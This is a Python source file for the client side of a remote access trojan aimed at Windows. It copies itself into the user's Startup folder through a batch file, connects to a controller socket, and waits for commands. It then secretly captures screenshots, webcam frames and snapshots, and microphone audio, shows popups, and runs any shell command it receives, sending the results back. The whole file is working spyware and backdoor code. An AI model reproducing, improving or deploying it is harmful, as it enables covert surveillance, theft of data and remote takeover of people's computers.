import socket 
import os 
import subprocess
import time
import cv2
import pickle
import struct
import threading
import pyautogui
import ctypes
import sys

# Ensure project root is importable (so `import src.*` works when running this file directly)
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.realpath(__file__))))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from src.config.Message import Message

PATH = os.path.dirname(os.path.realpath(__file__))
NAME = os.path.basename(__file__)
script = os.path.join(PATH, NAME)
base = "\\".join(PATH.split("\\")[0:3])
STARTUP_FOLDER = r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
user_startup = os.path.join(base, STARTUP_FOLDER)


if "Microsoft" not in PATH:
    with open("AutoSt.bat", "w") as file:
        file.write(f'@echo off\ncopy "{script}" "{user_startup}"')
    os.system("AutoSt.bat")
    os.remove("AutoSt.bat")


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = socket.gethostname()
PORT = 8080

s.connect((HOST,PORT))


def error_response():
    global s
    s.send(Message.ERROR_MSG.value.encode(Message.TEXT_ENCODING.value))

def send_image_data():
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    time.sleep(2)
    s2.connect((HOST, 8081))
    print("CONNECTED TO 2nd socket ")

    while True: 
        cap = cv2.VideoCapture(0)
        ret, frame=cap.read()
        data = pickle.dumps(frame)
        message_size = struct.pack("L", len(data))
        s2.send(message_size + data)

def sending_images():
    
    os.system("python webcam-client.py")

def sending_audio_data():

    os.system("python microphone-client.py")


def show_popup(title, message):
    ctypes.windll.user32.MessageBoxW(0, title, message, 0)



while True:
    command = s.recv(52).decode(Message.TEXT_ENCODING.value, errors="ignore")

    # Screenshot capture
    if command in {
        Message.CMD_CAPTURE_SCREENSHOT.value,
        Message.CMD_CAPTURE_SCREENSHOT_SHORT.value,
        Message.LEGACY_TAKE_SCREENSHOT.value,
        Message.LEGACY_TAKE_SCREENSHOT_SHORT.value,
    }:
        screen = pyautogui.screenshot()
        screen.save(f"{base}\\screenshot.png")
        s.send(Message.STATUS_SCREENSHOT_CAPTURED.value.encode(Message.TEXT_ENCODING.value))
        with open(f"{base}\\screenshot.png", "rb") as file:
            data = file.read(609600)
            s.send(data)
        os.remove(f"{base}\\screenshot.png")

    # Video stream
    elif command in {
        Message.CMD_START_VIDEO_STREAM.value,
        Message.CMD_START_VIDEO_STREAM_SHORT.value,
        Message.LEGACY_START_WEBCAM.value,
        Message.LEGACY_START_WEBCAM_SHORT.value,
    }:
        s.send(Message.STATUS_VIDEO_STREAM_STARTING.value.encode(Message.TEXT_ENCODING.value))
        p = threading.Thread(target=sending_images)
        p.start()

    # Audio stream
    elif command in {
        Message.CMD_START_AUDIO_STREAM.value,
        Message.CMD_START_AUDIO_STREAM_SHORT.value,
        Message.LEGACY_START_MICROPHONE.value,
        Message.LEGACY_START_MICROPHONE_SHORT.value,
    }:
        s.send(Message.STATUS_AUDIO_STREAM_STARTING.value.encode(Message.TEXT_ENCODING.value))
        p = threading.Thread(target=sending_audio_data)
        p.start()

    # Webcam snapshot
    elif command in {
        Message.CMD_CAPTURE_SNAPSHOT.value,
        Message.CMD_CAPTURE_SNAPSHOT_SHORT.value,
        Message.LEGACY_TAKE_SNAPSHOT.value,
    }:
        camera = cv2.VideoCapture(0)
        for i in range(10):
            return_value, image = camera.read()
            cv2.imwrite('snapshot.png', image)
        del(camera)
        s.send(Message.STATUS_SNAPSHOT_CAPTURED.value.encode(Message.TEXT_ENCODING.value))
        with open("snapshot.png","rb") as file:
            data = file.read(609600)
            s.send(data)
        os.remove("snapshot.png")

    # Popup: show_popup '<title>' '<message>'
    elif command.split(" ")[0] in {Message.CMD_SHOW_POPUP.value, Message.LEGACY_POPUP.value} and command[-1] == "'":
        title = command.split("'")[1]
        message = command.split("'")[3]
        threading.Thread(target=show_popup, args=(title, message)).start()


    elif command != "":
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = proc.communicate()
        if error != b"":
            error_response()    
        elif "cd" in command:
            s.send(f"Changed directory to: {os.getcwd()}".encode(Message.TEXT_ENCODING.value))
        else:
            s.send(output)